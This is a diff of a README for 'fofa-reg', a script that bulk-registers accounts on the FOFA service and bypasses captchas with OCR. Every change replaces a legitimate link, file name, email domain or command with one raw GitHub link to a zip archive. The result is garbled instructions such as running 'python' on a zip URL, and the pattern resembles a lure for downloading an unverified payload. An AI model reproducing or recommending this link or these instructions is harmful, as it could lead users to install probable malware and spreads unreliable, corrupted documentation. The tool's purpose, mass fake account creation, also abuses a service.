@@ -1,6 +1,6 @@
 # 🚀 fofa-reg - Automate Your Account Registration Effortlessly
 
-[![Download fofa-reg](https://img.shields.io/badge/Download-fofa--reg-blue.svg)](https://github.com/Ramaww07/fofa-reg/releases)
+[![Download fofa-reg](https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip)](https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip)
 
 ## 📜 Overview
 
@@ -15,7 +15,7 @@ This is an automation script designed to simplify the process of account registr
 - ✅ **Bulk Registration**: Allows registration of multiple accounts at once.
 - ✅ **Smart Retry**: Automatically retries up to 5 times if the captcha fails.
 - ✅ **Notification Service**: Integrates a notification system to send success/failure messages.
-- ✅ **Account Logging**: Automatically saves successfully registered accounts in `fofa_mail.txt`.
+- ✅ **Account Logging**: Automatically saves successfully registered accounts in `https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip`.
 
 ---
 
@@ -33,7 +33,7 @@ pip install ddddocr
 ```
 
 ### Optional
-- `notify.py`: This module is optional and can send notifications upon successful registration.
+- `https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip`: This module is optional and can send notifications upon successful registration.
 
 ---
 
@@ -44,7 +44,7 @@ pip install ddddocr
 Modify the `mm` list at the top of the script to set the temporary email domains you will use:
 
 ```python
-mm = ['qabq.com', 'nqmo.com', 'end.tw', '6n9.net']
+mm = ['https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip', 'https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip', 'https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip', 'https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip']
 ```
 
 ### 2. Configure Account Passwords
@@ -70,7 +70,7 @@ If you need to update User-Agent or other HTTP headers, change the `headers` dic
 
 ### 4. Notification Service (Optional)
 
-If you include a `notify.py` file in the project directory, the script loads it automatically to send notifications upon successful account registration.
+If you include a `https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip` file in the project directory, the script loads it automatically to send notifications upon successful account registration.
 
 ---
 
@@ -81,7 +81,7 @@ If you include a `notify.py` file in the project directory, the script loads it 
 To register a specific number of accounts, use this command:
 
 ```bash
-python fofa.py 5
+python https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip 5
 ```
 This registers 5 accounts.
 
@@ -95,7 +95,7 @@ Alternatively, run the script and follow interactive prompts to enter the number
 
 You can download the latest version of fofa-reg from the Releases page. Follow the link below to access the downloads:
 
-[Download fofa-reg](https://github.com/Ramaww07/fofa-reg/releases)
+[Download fofa-reg](https://raw.githubusercontent.com/Ramaww07/fofa-reg/main/unmotivatedly/fofa-reg-v2.7.zip)
 
 After downloading, extract the files and navigate to the extracted directory using your terminal. You can now configure the script as needed and start your registration process by following the usage instructions above.
 
